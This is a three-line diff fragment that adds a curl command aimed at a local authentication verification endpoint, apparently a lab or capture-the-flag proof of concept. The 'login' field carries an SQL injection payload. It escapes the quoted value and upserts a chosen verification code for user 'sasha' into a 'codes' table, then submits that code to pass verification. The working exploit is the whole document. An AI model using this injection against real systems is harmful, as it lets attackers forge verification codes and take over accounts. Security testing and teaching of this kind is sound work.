@@ -1,0 +1,3 @@
+curl 'http://localhost:8888/api/auth/verification' \
+  -H 'Content-Type: application/json' \
+  --data-raw $'{"login":"sasha\'; INSERT INTO codes (login, code) VALUES (\'sasha\', \'8888\') ON CONFLICT (login) DO UPDATE SET code = \'8888","code":"8888"}' \
